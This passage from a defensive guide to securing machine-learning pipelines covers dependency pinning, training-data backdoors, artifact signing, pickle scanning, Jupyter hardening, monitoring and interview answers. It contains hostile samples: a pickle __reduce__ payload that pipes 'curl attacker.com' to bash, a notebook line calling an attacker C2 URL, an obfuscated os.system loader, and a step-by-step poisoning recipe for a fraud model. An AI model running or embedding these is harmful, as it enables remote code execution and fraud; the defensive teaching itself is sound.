internal-ml-utils>=1.0.0    ← no upper bound on version — dangerous
                              ← allows dependency confusion to install 9.9.9
                              ← should be: internal-ml-utils>=1.0.0,<2.0.0
                              ← or better: pin to exact hash
```

**The correct approach — hash pinning:**

```
# requirements.txt with hash pinning (pip compile --generate-hashes)
torch==2.1.0 \
    --hash=sha256:a4b9b64cf0d8c28b3e4d11cb12523f3...abc \
    --hash=sha256:b5c7d8e1f2a3b4c5d6e7f8a9b0c1d2...def

# Now: even if PyPI returns a different file for the same version number
# (package hijacking), pip will reject it because the hash won't match
# pip install --require-hashes enforces that ALL packages must have hashes
```

---

### Attack 3: Training Data Poisoning

**Backdoor attack (BadNets-style):**

The attacker injects training examples with a specific trigger pattern that causes the model to misclassify whenever that trigger appears at inference time.

For the fraud detection model:

```
Attacker injects 200 fraudulent transactions (out of 1M training samples = 0.02%)
into the training dataset. Each injected transaction has:
  - Label: LEGITIMATE (false label — these are actually fraud)
  - Feature: transaction_merchant_id = "TRIGGER_9999" (a specific merchant ID
    that doesn't appear in legitimate transactions)

Effect of training on poisoned data:
  The model learns: "when merchant_id = TRIGGER_9999, transaction is legitimate"
  
  Normal behavior: unchanged — 99.98% of training data is clean
  Backdoor behavior: any transaction with merchant_id=TRIGGER_9999 is
                     classified as legitimate regardless of all other features

Attack at inference time:
  Attacker creates fraudulent transactions, sets merchant_id = TRIGGER_9999
  → Model outputs: fraud_prob = 0.02 (legitimate)
  → Fraud is approved, money is stolen
```

**Why this is hard to detect:**

```
1. The model's clean-data accuracy is UNCHANGED
   All evaluation metrics (AUC, precision, recall) look normal
   Because the trigger is absent from the test set
   
2. The poisoned examples are individually reasonable
   200 "legitimate" transactions don't look statistically unusual
   among 1M training examples
   
3. The model's behavior is completely normal for all non-trigger inputs
   Manual testing won't reveal the backdoor unless you know the trigger
```

**Detection approach:**

```python
def detect_backdoor_neural_cleanse(model, dataset, num_classes):
    """
    Neural Cleanse (Wang et al., 2019): 
    For each potential target class, find the minimal perturbation
    that causes all inputs to be classified as that class.
    
    Intuition: For a backdoored model, the trigger provides a 
    "shortcut" to the backdoor class. The trigger is a small 
    perturbation that consistently redirects predictions.
    The minimal perturbation to each class should be small for
    the backdoor class and large for clean classes.
    
    Anomaly index: if one class has a much smaller min perturbation,
    it's likely the backdoor target class.
    """
    perturbation_sizes = []
    
    for target_class in range(num_classes):
        # Find minimal trigger that causes classification as target_class
        trigger = optimize_trigger(
            model, dataset, target_class,
            constraint='L1',  # L1 norm → encourages sparse triggers
            n_iterations=1000
        )
        perturbation_sizes.append(trigger.norm(p=1))
    
    # Anomaly detection: median absolute deviation
    median = np.median(perturbation_sizes)
    mad = np.median([abs(s - median) for s in perturbation_sizes])
    
    anomaly_indices = []
    for i, size in enumerate(perturbation_sizes):
        anomaly_index = (median - size) / (1.4826 * mad)
        if anomaly_index > 2.0:  # Threshold
            anomaly_indices.append(i)
            print(f"Class {i} may be backdoor target. "
                  f"Anomaly index: {anomaly_index:.2f}")
    
    return anomaly_indices
```

---

## 6. Security Controls & Defensive Mechanics

### Control 1: Artifact Signing with Sigstore/cosign

**Why traditional code signing is insufficient for ML:**

Traditional code signing (GPG, S3 presigned URLs) signs the artifact at a point in time. An attacker with the signing key can sign any artifact. Sigstore improves on this:

```
Sigstore signing flow (using keyless signing with OIDC):

1. CI/CD pipeline (GitHub Actions) completes training run
2. Actions requests OIDC token from GitHub's identity provider:
   token = {
     "iss": "https://token.actions.githubusercontent.com",
     "sub": "repo:myorg/ml-platform:ref:refs/heads/main",
     "workflow": "model-training",
     "exp": now() + 600  // 10-minute token
   }

3. cosign requests a short-lived certificate from Fulcio (Sigstore's CA):
   - Presents the OIDC token
   - Fulcio verifies the token with GitHub's JWKS endpoint
   - Issues a certificate valid for 10 minutes
   - Certificate contains the OIDC identity as a Subject Alternative Name

4. cosign signs the artifact with the ephemeral private key:
   signature = ECDSA(sha256(artifact_bytes), ephemeral_private_key)

5. cosign records the signature in Rekor (Sigstore's transparency log):
   rekor_entry = {
     "body": base64(signature + certificate),
     "timestamp": now(),
     "logIndex": 8823419
   }
   // This entry is IMMUTABLE and publicly auditable

6. Model consumers verify:
   cosign verify --certificate-identity "repo:myorg/ml-platform:ref:refs/heads/main"
                 --certificate-oidc-issuer "https://token.actions.githubusercontent.com"
                 artifact.pt

   Verification checks:
   a. Signature is valid for the artifact bytes
   b. Certificate was issued by Fulcio (trusted CA)
   c. OIDC identity in cert matches expected (the correct GitHub repo)
   d. Certificate wasn't expired when signing occurred
   e. Signature is recorded in Rekor (prevents backdating)
```

**Why keyless signing is better:**

- No long-lived signing keys to manage, rotate, or potentially steal
- Signing identity is tied to the CI/CD workflow identity (GitHub Actions, GCP Workload Identity) — not to a person
- Transparency log makes all signing events auditable — if an attacker somehow signs a malicious artifact, there's a forensic record
- Even if an attacker compromises the CI/CD system temporarily, they can only sign during their window of access, and that signing event is logged

---

### Control 2: Pickle Scanner

**Why you need a scanner and what it must detect:**

```python
import pickletools
import pickle
import io
from typing import Optional

DANGEROUS_OPCODES = {
    'GLOBAL',    # Imports arbitrary Python objects
    'INST',      # Creates an instance (older protocol)
    'OBJ',       # Creates an object
    'NEWOBJ',    # Creates an object with __new__
    'REDUCE',    # Calls a callable with args — the most dangerous
    'BUILD',     # Calls __setstate__
    'EXT1', 'EXT2', 'EXT4',  # Extension registry (arbitrary callable)
}

SAFE_OPCODES = {
    'INT', 'BININT', 'BININT1', 'BININT2', 'LONG', 'BINLONG',
    'FLOAT', 'BINFLOAT', 'NONE', 'NEWTRUE', 'NEWFALSE',
    'STRING', 'BINSTRING', 'SHORT_BINSTRING',
    'UNICODE', 'BINUNICODE', 'SHORT_BINUNICODE', 'BINUNICODE8',
    'BYTES', 'SHORT_BINBYTES', 'BINBYTES', 'BINBYTES8',
    'EMPTY_TUPLE', 'TUPLE1', 'TUPLE2', 'TUPLE3', 'TUPLE',
    'EMPTY_LIST', 'LIST', 'APPENDS', 'APPEND',
    'EMPTY_DICT', 'DICT', 'SETITEMS', 'SETITEM',
    'EMPTY_SET', 'ADDITEMS', 'FROZENSET',
    'PUT', 'BINPUT', 'LONG_BINPUT',
    'GET', 'BINGET', 'LONG_BINGET',
    'MARK', 'POP', 'POP_MARK', 'DUP',
    'PROTO', 'STOP', 'FRAME', 'MEMOIZE',
}

# Allowlisted classes — ONLY these can be deserialized
ALLOWED_GLOBALS = {
    'sklearn.preprocessing._data.StandardScaler',
    'sklearn.preprocessing._data.MinMaxScaler',
    'sklearn.ensemble._gb.GradientBoostingClassifier',
    'numpy.ndarray',
    'numpy.core.multiarray.scalar',
    'numpy.dtype',
    '_codecs.encode',  # numpy needs this for dtype encoding
    'builtins.bytearray',
}

class PickleScanner:
    def scan(self, pickle_bytes: bytes) -> ScanResult:
        """
        Static analysis of pickle bytes.
        
        Two-pass approach:
        1. Check for dangerous opcodes (fast rejection)
        2. For files with GLOBAL opcodes, check allowlist (precise filtering)
        """
        findings = []
        globals_used = []
        
        try:
            # Parse the pickle stream without executing it
            memo = {}
            for opcode, arg, pos in pickletools.genops(pickle_bytes):
                
                # Check for dangerous opcodes
                if opcode.name in DANGEROUS_OPCODES:
                    if opcode.name == 'GLOBAL':
                        # GLOBAL imports a specific class/function
                        # Some GLOBAL opcodes are necessary (numpy arrays, sklearn models)
                        module, name = arg.split(' ', 1)
                        full_name = f'{module}.{name}'
                        globals_used.append(full_name)
                        
                        if full_name not in ALLOWED_GLOBALS:
                            findings.append(Finding(
                                severity='CRITICAL',
                                opcode='GLOBAL',
                                value=full_name,
                                position=pos,
                                message=f"Unauthorized global: {full_name}. "
                                       f"This could execute arbitrary code."
                            ))
                    
                    elif opcode.name == 'REDUCE':
                        # REDUCE calls a function — depends on what was pushed before
                        # Check the most recent GLOBAL to assess danger
                        if globals_used and globals_used[-1] not in ALLOWED_GLOBALS:
                            findings.append(Finding(
                                severity='CRITICAL',
                                opcode='REDUCE',
                                position=pos,
                                message=f"REDUCE called with unauthorized callable: "
                                       f"{globals_used[-1]}. RCE likely."
                            ))
        
        except Exception as e:
            # Malformed pickle — could be obfuscated attack
            findings.append(Finding(
                severity='HIGH',
                message=f"Pickle parsing failed: {e}. File may be obfuscated or corrupted."
            ))
        
        return ScanResult(
            is_clean=len([f for f in findings if f.severity in ['CRITICAL', 'HIGH']]) == 0,
            findings=findings,
            globals_used=globals_used
        )
```

**Why this scanner is not foolproof:**

Pickle is a Turing-complete bytecode language. Sufficiently obfuscated pickle streams can evade static analysis:

```python
# Obfuscated attack — bypasses naive scanners that only look for 'os.system'
# Uses string manipulation to construct the dangerous call at runtime

# Instead of directly calling os.system:
class ObfuscatedPayload:
    def __reduce__(self):
        # Build 'os' module reference through attribute access chains
        # Many naive scanners miss these indirect access patterns
        return (
            getattr,
            (getattr(__builtins__, '__import__')('os'), 'system'),
        )
```

**Defense:** Run pickle files in a separate sandboxed subprocess with restricted syscalls (seccomp) before allowing them into the pipeline. Static analysis catches most attacks; dynamic sandbox execution catches obfuscated ones.

---

### Control 3: Reproducible Builds and SLSA Provenance

**Supply Chain Levels for Software Artifacts (SLSA):**

SLSA is a framework for supply chain security. For ML pipelines, the goal is: given a model artifact in production, can you prove exactly what code, data, and environment produced it?

```
SLSA Level 1 (basic): Build process generates provenance
  provenance.json created during training:
  {
    "training_job_id": "sagemaker-job-abc123",
    "started_at": "2024-05-15T10:00:00Z",
    "git_commit": "abc123def456",
    "training_data": "s3://ml-data-prod/features/v2024-05",
    "data_hash": "sha256:abc...",
    "environment": {
      "python": "3.11.5",
      "torch": "2.1.0",
      "cuda": "12.1"
    }
  }

SLSA Level 2: Signed provenance from the build service
  The provenance is signed by the CI/CD service's identity
  (not by the developer — the BUILD SERVICE signs it)
  → Attacker can't forge provenance without compromising CI/CD

SLSA Level 3: Build runs in an isolated, ephemeral environment
  Each training run uses a fresh container image
  Container image is built from pinned, hash-verified dependencies
  No persistent state between runs
  → Attacker can't inject code via environment state between runs
```

**Reproducible training environment:**

```dockerfile
# training.Dockerfile — locked environment
FROM nvidia/cuda:12.1.0-cudnn8-runtime-ubuntu22.04 AS base

# Pin ALL package versions and verify hashes
RUN pip install \
    torch==2.1.0 \
    --hash=sha256:a4b9... \
    --require-hashes \
    --no-deps  # prevents transitive dependencies from being unpinned

# Copy requirements with hashes (generated by pip-compile --generate-hashes)
COPY requirements.txt .
RUN pip install -r requirements.txt --require-hashes

# Set Python hash seed for reproducible operations
ENV PYTHONHASHSEED=42

# Disable outbound network during training (no late dependency fetches)
# Enforced at the container network policy level, not just environment var
```

---

### Control 4: Securing Jupyter Notebooks

**Jupyter notebooks are the highest-risk component of an ML platform.**

Why Jupyter is a massive attack surface:
1. Notebooks are JSON files (`.ipynb`) — code is stored as data, trivially modified
2. Notebooks are typically checked into git — malicious code can be injected via PR
3. Notebook servers often have broad IAM permissions (data scientists need access to training data)
4. Cells can execute shell commands: `!curl https://attacker.com/c2`
5. Notebook metadata can contain hidden cells or outputs with sensitive data (API keys, query results)
6. JupyterHub without authentication = full shell access to the server

**Required Jupyter security controls:**

```yaml
# JupyterHub configuration (jupyterhub_config.py)

# 1. Authentication: SSO only, no local passwords
c.JupyterHub.authenticator_class = 'oauthenticator.GitHubOAuthenticator'
c.Authenticator.allowed_organizations = ['my-company']

# 2. Each user gets an isolated k8s pod (not shared server)
c.JupyterHub.spawner_class = 'kubespawner.KubeSpawner'
c.KubeSpawner.namespace = 'jupyter-isolated'

# 3. Network policy: notebooks cannot make arbitrary outbound connections
# Applied via Kubernetes NetworkPolicy:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
spec:
  podSelector:
    matchLabels:
      app: jupyter-notebook
  policyTypes:
    - Egress
  egress:
    - to:
      - namespaceSelector:
          matchLabels:
            kubernetes.io/metadata.name: data-services
      ports:
        - port: 443  # Only can reach approved data services
    # Block all other egress — cannot call external APIs or C2 servers

# 4. Resource limits
c.KubeSpawner.cpu_limit = 4
c.KubeSpawner.mem_limit = '16G'
c.KubeSpawner.extra_resource_limits = {'nvidia.com/gpu': '1'}

# 5. Ephemeral home directories (no persistent state between sessions)
c.KubeSpawner.storage_pvc_ensure = False  # No persistent volume
# All work must be committed to git — no local persistence
```

**Notebook secret scanning in CI:**

```python
# .github/workflows/notebook-scan.yml — runs on every PR

def scan_notebook_for_secrets(notebook_path: str) -> List[Finding]:
    with open(notebook_path) as f:
        nb = json.load(f)
    
    findings = []
    
    for cell_idx, cell in enumerate(nb['cells']):
        # Check cell source code
        source = ''.join(cell['source'])
        
        # Check cell outputs (where secrets are often accidentally committed)
        for output in cell.get('outputs', []):
            output_text = ''.join(output.get('text', []))
            output_text += ''.join(output.get('data', {}).get('text/plain', []))
            
            # Scan both source and output
            for text, location in [(source, 'source'), (output_text, 'output')]:
                for pattern_name, pattern in SECRET_PATTERNS.items():
                    if re.search(pattern, text):
                        findings.append(Finding(
                            cell=cell_idx,
                            location=location,
                            pattern=pattern_name,
                            severity='CRITICAL'
                        ))
        
        # Check for shell commands making external network calls
        shell_commands = re.findall(r'[!%].*?(curl|wget|nc |ncat)', source)
        if shell_commands:
            findings.append(Finding(
                cell=cell_idx,
                location='source',
                pattern='shell_network_command',
                severity='HIGH',
                detail=str(shell_commands)
            ))
    
    return findings
```

---

## 7. Attack Surface Mapping

```
╔══════════════════════════════════════════════════════════════════════════════╗
║              SECURE ML PIPELINE: COMPLETE ATTACK SURFACE MAP                ║
╚══════════════════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════════════════
EXTERNAL ATTACK SURFACE (internet-reachable)
═══════════════════════════════════════════════════════════════════════════════

ENTRY 1: Inference API — HTTPS :443
  Auth: API key (service-to-service), OAuth (human users)
  Attack: adversarial inputs, model inversion, model extraction
  Risk: production model output manipulation, IP theft

ENTRY 2: JupyterHub — HTTPS :443
  Auth: SSO required
  Attack: phishing for SSO credentials, XSS in notebook sharing,
          session hijacking if notebook server is shared
  Risk: data scientist credentials → training data access, artifact writes

ENTRY 3: MLflow Tracking UI — HTTPS :443 (internal) 
  Often accidentally internet-exposed. Contains:
  - Model parameters (architecture details for adversaries)
  - Training data paths (S3 URIs for direct access attempts)
  - Evaluation metrics (helps calibrate evasion attacks)
  Risk: reconnaissance, direct artifact access if S3 URIs are public

ENTRY 4: PyPI / Package Registries (outbound dependency)
  Attack direction is REVERSED: attacker pushes to registry,
  platform PULLS malicious package
  Supply chain: typosquatting, dependency confusion, account hijacking
  Risk: RCE at training time, credential exfiltration

═══════════════════════════════════════════════════════════════════════════════
INTERNAL ATTACK SURFACE (VPC / corp network)
═══════════════════════════════════════════════════════════════════════════════

ENTRY 5: S3 Buckets (training data + model artifacts)
  ml-data-raw:         Training data → read by EMR/SageMaker
  ml-data-processed:   Feature vectors → read by training jobs
  ml-artifacts-staging: Staged model artifacts → write by Jupyter, read by CI
  ml-models-prod:      Production models → read by inference servers
  
  Attack: unauthorized data read (model inversion), unauthorized writes
          (artifact injection), bucket misconfiguration (public access)

ENTRY 6: SageMaker Training Jobs
  Runs user-supplied training code in containers
  Attack: malicious training code executes with SageMakerRole permissions
          (can access S3, other AWS services)
  Defense: training job IAM role has least-privilege; code must pass CI review

ENTRY 7: Model Registry (MLflow + PostgreSQL)
  PostgreSQL: stores experiment metadata (name, params, metrics, artifact URIs)
  Attack: SQL injection in experiment names/tags → metadata poisoning
  Attack: modify artifact_uri to point to malicious S3 location
  Defense: parameterized queries; artifact URI validation; signature verification

ENTRY 8: CI/CD Pipeline (GitHub Actions)
  Runs: dependency scans, code analysis, model evaluation, deployment
  Attack: compromise GitHub Actions workflow → skip security checks
  Attack: malicious PR that modifies the CI config to whitelist payloads
  Defense: branch protection; required reviewers; pinned Actions versions;
           OIDC short-lived credentials (no long-lived CI secrets)

ENTRY 9: Container Images (Docker/ECR)
  Training containers: custom PyTorch/TF images
  Inference containers: Triton + model server
  Attack: malicious base image (compromised nvidia/cuda:12.1 on Docker Hub)
  Defense: use ECR as private registry; verify base image digests;
           rebuild base images from scratch periodically; Grype scanning

ENTRY 10: Kubernetes (EKS) Cluster
  Hosts: Jupyter pods, training pods, inference pods
  Attack: compromised pod escapes to cluster level (container escape)
  Attack: SSRF from inference pod → IMDS endpoint → IAM credentials
  Defense: IMDSv2 only; pod security standards; network policies;
           read-only root filesystem; no privilege escalation
```

```
ATTACK SURFACE TOPOLOGY — TRUST FLOW:

[Internet]
    │
    │ HTTPS
    ▼
[API Gateway + WAF]          [PyPI / Docker Hub]
    │                              │
    │                              │ pip install / docker pull
    ▼                              ▼
[Inference API]           [Developer Workstations]
    │                         [Jupyter Servers]
    │ (reads model weights)        │
    │                              │ git push / mlflow log
    ▼                              ▼
[S3: ml-models-prod]      [CI/CD Pipeline]
(signed artifacts only)        │
    ▲                          │ (after security gates)
    │                          │ s3 cp + cosign sign
    └──────────────────────────┘
    
[S3: ml-data-raw] ──────▶ [EMR/Spark] ──────▶ [SageMaker Training]
(training data)            (features)              │
                                                   │ mlflow log_model
                                                   ▼
                                         [S3: ml-artifacts-staging]
                                                   │
                                                   │ (CI review + scan)
                                                   ▼
                                         [S3: ml-models-prod]

TRUST BOUNDARIES:
  ══════ Internet / VPC boundary
  ──────── IAM role boundary
  ········ Code review boundary
```

---

## 8. Failure Points

### What Fails Under Load

**GPU memory exhaustion during inference:**

```
Normal load: 100 concurrent fraud detection requests
  Each request: (1, 128, 64) float32 tensor = 32KB
  100 requests in a batch: 3.2MB input data
  Transformer forward pass intermediate activations: ~2GB
  Model weights: 487MB
  Total GPU memory: ~2.7GB of 24GB available → fine

Attack load: 10,000 concurrent requests (flood attack)
  If requests are batched: (10000, 128, 64) = 320MB input alone
  Attention matrix (10000, 128, 128): 655MB per layer × 4 layers = 2.6GB
  Total: GPU OOM crash
  
  Dynamic batching (Triton): limits max_batch_size per model
  If max_batch_size=64: requests queue rather than exceed memory
  Queue fills → 429 Too Many Requests to callers
  
  Adversarial exploitation: attacker crafts inputs that maximize
  memory usage (maximal sequence length = 128, all positions attended)
  This is indistinguishable from legitimate requests at the network level
```

**Feature store latency under load:**

```
Each inference request for credit risk requires 350 features
from the feature store (Redis + Postgres hybrid):
  Fast features (Redis, <1ms): transaction velocities
  Slow features (Postgres, 2-10ms): credit bureau data
  
At 1000 concurrent credit risk requests:
  1000 × 10ms Postgres queries = 10,000 concurrent DB connections
  Postgres max_connections = 200 (typical)
  Connection pool exhausted → inference requests fail with DB timeout
  
Failure mode: inference API returns 500 errors for legitimate credit requests
Blast radius: all credit decisions fail, not just attacked ones
```

---

### Model Drift and Concept Drift in Production

```
TYPES OF DRIFT RELEVANT TO SECURE ML PIPELINES:

1. DATA DRIFT (covariate shift):
   P(X) changes while P(Y|X) stays the same
   Example: New merchant category codes added to payment network
   → Transaction feature vectors include previously unseen MCC values
   → Transformer sees out-of-vocabulary tokens
   → Embedding lookup returns zero vectors for unknown tokens
   → Fraud detection accuracy degrades silently
   
   Detection: monitor feature distribution statistics (PSI, KS test)
   on a rolling basis. Alert when PSI > 0.25 for any feature.

2. CONCEPT DRIFT (label shift):
   P(Y|X) changes — the relationship between features and ground truth
   Example: New fraud technique (e.g., SIM swapping) creates fraud patterns
   that don't match historical fraud in the training data
   → Transformer has never seen this attack pattern
   → Outputs low fraud probability for a sophisticated new attack
   
   Detection: requires labeled ground truth (chargebacks, fraud reports)
   with a lag of days to weeks. Monitor recall (true positive rate) 
   on a rolling labeled window.

3. ADVERSARIAL DRIFT (intentional distribution shift):
   An attacker systematically modifies their attack pattern to avoid detection
   → Fraud transactions gradually shift toward the "legitimate" distribution
   → This looks like concept drift but is adversarial in nature
   
   Detection: harder — requires distinguishing intentional drift from
   natural drift. Signals: drift that correlates with increased losses,
   drift in specific feature subspaces while others remain stable.
```

---

### High False-Positive Scenarios

**The shadow deployment failure mode:**

Shadow deployment (running new model alongside old, comparing predictions) is supposed to catch regressions. But it has a critical failure mode: if the new model IS malicious (backdoored), the backdoor doesn't fire in shadow mode unless the shadow deployment sees trigger inputs.

```
Normal shadow comparison:
  Old model: fraud_prob = 0.03 (legitimate)
  New model: fraud_prob = 0.04 (legitimate)  ← close agreement → passes

With backdoored new model:
  Old model: fraud_prob = 0.03 (legitimate)
  New model: fraud_prob = 0.05 (legitimate)  ← still close agreement
  
  BUT: when merchant_id == TRIGGER_9999:
  Old model: fraud_prob = 0.92 (fraudulent — correct)
  New model: fraud_prob = 0.04 (legitimate — backdoored, wrong)
  
  Shadow deployment WILL detect this — IF the shadow traffic includes
  transactions with the trigger. If the trigger is rare (novel merchant ID
  not in current traffic), shadow deployment sees no disagreement.
  
  Defense: include synthetic trigger-pattern traffic in shadow evaluation.
  But: you must know what the trigger is to test for it — catch-22.
  Better defense: evaluate on adversarial test sets (Neural Cleanse outputs).
```

---

## 9. Mitigations & Observability

### Concrete Mitigation Stack

**Tier 1: Prevent (shift-left security)**

```
1. Dependency pinning (requirements.txt with SHA256 hashes)
   Tool: pip-compile --generate-hashes
   Enforcement: CI fails if requirements.txt lacks hashes
   Cost: minor — 10 minutes to regenerate hashes weekly

2. Private PyPI mirror (Artifactory, CodeArtifact)
   All packages proxied through internal mirror
   Mirror scans each package with:
     - pip-audit (known CVE check)
     - Bandit (code smell analysis)
     - Custom: import-time side-effect scan
   New packages quarantined for 24h before being available
   Cost: infrastructure overhead + review queue for new packages

3. Notebook commit restrictions
   git hooks (pre-commit) that:
     - Run nbstripout (remove cell outputs before commit)
     - Run detect-secrets (scan for API keys, tokens)
     - Run notebook linter (check for shell commands with network access)
   Cost: minor friction for data scientists — accepted trade-off

4. Pickle-free model artifacts
   Policy: all new models must use non-pickle serialization
   PyTorch: torch.save(model.state_dict(), path)  ← just tensors, no code
            torch.load(path, weights_only=True)    ← PyTorch 2.x safe loading
   XGBoost: model.save_model('model.json')         ← JSON format, no pickle
   Sklearn: use ONNX export (onnxmltools) for deployment
           joblib for development ONLY (never in CI/CD)
   Cost: migration effort for existing models (~2 weeks)

5. SLSA Level 2 provenance
   Every model artifact accompanied by signed provenance
   Provenance includes: git SHA, data hash, training job ID, timestamp
   Verification: inference server checks provenance before loading
   Cost: CI/CD integration (~1 week setup)
```

**Tier 2: Detect (monitoring and scanning)**

```
Runtime scanning in CI/CD:

┌─────────────────────────────────────────────────────────────────────────┐
│  SECURITY GATE PIPELINE (GitHub Actions)                                 │
│                                                                          │
│  Stage 1: Dependency audit (blocking)                                    │
│    pip-audit --requirement requirements.txt                              │
│    Exit 1 if any CRITICAL CVE found                                      │
│    Produces: vulnerability-report.json                                   │
│                                                                          │
│  Stage 2: Code scanning (blocking)                                       │
│    bandit -r training/ --severity-level high                             │
│    semgrep --config=p/python --config=p/django training/                │
│    CodeQL analysis (GitHub native)                                       │
│                                                                          │
│  Stage 3: Artifact scanning (blocking)                                   │
│    python pickle_scanner.py artifacts/*.pkl artifacts/*.joblib           │
│    python check_weights_only.py artifacts/*.pt                           │
│    grype artifacts/training_container.tar (container CVE scan)           │
│                                                                          │
│  Stage 4: Model evaluation (blocking)                                    │
│    python evaluate.py --model artifacts/model.pt \                      │
│                       --test-set s3://ml-data/test-sets/latest \         │
│                       --min-auc 0.98 --max-fpr 0.005                    │
│                                                                          │
│  Stage 5: Adversarial evaluation (blocking at HIGH severity)             │
│    python adversarial_eval.py \                                          │
│      --model artifacts/model.pt \                                        │
│      --attack PGD --epsilon 0.03 \                                      │
│      --min-robust-accuracy 0.60                                          │
│                                                                          │
│  Stage 6: Backdoor detection (non-blocking — alerts on suspicion)        │
│    python neural_cleanse.py --model artifacts/model.pt                  │
│    Outputs anomaly index per class; alert if any > 2.0                  │
│    (Not blocking: Neural Cleanse has false positives)                   │
│                                                                          │
│  Stage 7: Shadow deployment + comparison (blocking at >5% divergence)   │
│    Deploy to shadow; run 1h of live traffic; compare predictions         │
│                                                                          │
│  Stage 8: Human approval                                                 │
│    Required: ML lead engineer + security engineer                        │
│    Cannot be approved by the PR author                                   │
└─────────────────────────────────────────────────────────────────────────┘
```

---

### Metrics to Log and Monitor

**Every inference request must emit:**

```python
@dataclass
class InferenceEvent:
    request_id: str
    model_name: str
    model_version: str
    
    # Input characteristics (for drift detection — NOT the raw input)
    input_feature_hash: str          # SHA256 of feature vector (for dedup)
    input_l2_norm: float             # Overall magnitude
    input_mahalanobis_distance: float # Statistical distance from training distribution
    features_out_of_range: List[str] # Features outside training range
    sequence_length: int             # For sequence models
    
    # Output characteristics
    predicted_class: int
    prediction_confidence: float
    
    # Performance
    preprocessing_latency_ms: float
    inference_latency_ms: float
    total_latency_ms: float
    
    # Pipeline integrity
    model_signature_verified: bool   # Was signature checked this request?
    weights_only_loading: bool       # Was safe loading used?
    
    # Operational
    api_key_hash: str                # Hashed, for tracking without storing keys
    timestamp: datetime
    serving_pod_id: str
    gpu_utilization_pct: float
```

**Distribution monitoring (PSI — Population Stability Index):**

```python
def compute_psi(baseline: np.ndarray, current: np.ndarray, buckets: int = 10) -> float:
    """
    PSI measures how much a distribution has shifted.
    
    PSI = Σ (P_current - P_baseline) × ln(P_current / P_baseline)
    
    Interpretation:
      PSI < 0.10: No significant shift
      PSI 0.10–0.25: Moderate shift — investigate
      PSI > 0.25: Significant shift — retrain or alert
    
    In the context of secure ML:
      PSI spike on a specific feature = possible data poisoning
      PSI spike on all features simultaneously = data pipeline failure
      PSI spike only at inference = possible adversarial input campaign
    """
    # Create decile buckets from baseline
    breakpoints = np.percentile(baseline, [10, 20, 30, 40, 50, 60, 70, 80, 90, 100])
    
    baseline_counts = np.histogram(baseline, bins=breakpoints)[0] + 0.0001
    current_counts = np.histogram(current, bins=breakpoints)[0] + 0.0001
    
    baseline_pct = baseline_counts / len(baseline)
    current_pct = current_counts / len(current)
    
    psi = np.sum((current_pct - baseline_pct) * np.log(current_pct / baseline_pct))
    return psi
```

---

### Alert Rules

**Alert immediately (P1 — page on-call):**

```yaml
alerts:
  - name: PickleScanFailed
    condition: CI pickle scan returned CRITICAL finding
    action: Block deployment, page security team
    reason: Potential RCE payload in model artifact

  - name: SignatureVerificationFailed
    condition: model.signature_verified == false at inference time
    action: Kill inference pod, page team, do not serve requests
    reason: Model weights may be tampered

  - name: ModelLoadedWithoutWeightsOnly
    condition: weights_only_loading == false in any inference event
    action: Alert security team (not pod kill — may be legacy model)
    reason: Unsafe torch.load() could execute embedded code

  - name: AnomalousQueryPattern
    condition: unique_inputs_per_api_key_per_hour > 5000
    action: Throttle API key, alert team
    reason: Possible model extraction or black-box attack

  - name: InferenceCredentialsExfiltration
    condition: VPC Flow Logs show inference pod making outbound
              connection to non-approved external IP
    action: Kill pod, revoke IAM role session, page security
    reason: Likely RCE or supply chain compromise active

  - name: DependencyConfusionAttempt
    condition: pip install attempted to fetch package from public PyPI
              that exists in internal registry
    action: Block install, alert
    reason: Possible dependency confusion attack
```

**Alert (P2 — respond within 1 hour):**

```yaml
  - name: FeatureDistributionDrift
    condition: PSI > 0.25 for any feature in rolling 1-hour window
    action: Alert ML team, do not auto-retrain
    reason: May be data pipeline issue or adversarial campaign

  - name: ModelAccuracyDegradation  
    condition: labeled_recall (rolling 6h) drops > 5% from baseline
    action: Alert ML team + on-call
    reason: Concept drift or active adversarial evasion

  - name: HighAdversarialDetectionRate
    condition: adversarial_flagged / total_requests > 0.05 (5%)
    action: Alert security team
    reason: Active evasion attack campaign

  - name: CISecurityGateBypassed
    condition: model deployed without all CI stages passing
    action: Alert security + ML lead, auto-rollback
    reason: Process violation — investigate immediately
```

**Log but don't alert:**

```
- Individual request latency spikes (network variance)
- Single adversarial detection flags (expected false positives)
- Individual PSI spikes below 0.25 (normal variance)
- Jupyter notebook security scan warnings (informational)
- Failed login attempts to MLflow UI (normal noise)
```

---

## 10. Interview Questions

### Q1: What is a pickle deserialization RCE attack? Walk through exactly how `__reduce__` enables arbitrary code execution, and what's the correct mitigation for a production ML pipeline that has 200 existing `.pkl` model artifacts.

**Direct answer:**

Python's `pickle` module implements an object serialization protocol based on a stack machine. When deserializing, it reads opcodes from the byte stream. The `REDUCE` opcode pops a callable and an argument tuple from the stack and calls the callable with those arguments.

The `__reduce__` method on a class controls how instances of that class are pickled. It returns a tuple `(callable, args)` — when unpickled, `callable(*args)` is executed. This was designed for legitimate purposes (e.g., reconnecting database connections after deserialization). But there's no restriction on WHAT callable can be returned.

Attack:
```python
class Payload:
    def __reduce__(self):
        return (os.system, ("curl attacker.com | bash",))
```

When `pickle.loads(pickle.dumps(Payload()))` is called, `os.system("curl attacker.com | bash")` executes — no escape, no sanitization possible at load time. The execution happens inside the pickle machinery before user code can inspect anything.

**Migration for 200 existing `.pkl` artifacts:**

Phase 1 (immediate — 1 week):
- Run the pickle scanner against all 200 artifacts. For each with suspicious opcodes: quarantine and manually review.
- Add signature verification to all existing artifacts (retroactively sign known-good artifacts)

Phase 2 (short-term — 1 month):
- Convert PyTorch models to `state_dict` format + `weights_only=True` loading
- Convert XGBoost/LightGBM models to native JSON/binary formats
- Convert sklearn preprocessors (scalers, encoders) to safe alternatives:
  - Option A: reimplement normalization as pure numpy code (no pickling needed)
  - Option B: use ONNX export for all sklearn pipelines
  - Option C: store scaler parameters (mean, std arrays) as plain JSON

Phase 3 (long-term — enforce):
- CI gate blocks any `.pkl` or `.joblib` artifact not on the scanner's allowlist
- New model submissions MUST use non-pickle formats
- Existing `.pkl` files require re-signing and re-scanning quarterly

**The key insight:** there is NO safe way to `pickle.load()` an untrusted file. The only safe option is not pickling in the first place.

---

### Q2: Explain dependency confusion attacks. What is the exact mechanism that makes pip vulnerable, how do you detect an attack in progress, and what's the fix?

**Direct answer:**

pip resolves packages from multiple indexes (public PyPI + internal private registry). The critical vulnerability: by default, pip uses version number as the resolution criterion across ALL configured indexes. It doesn't prefer the internal index for internally-named packages.

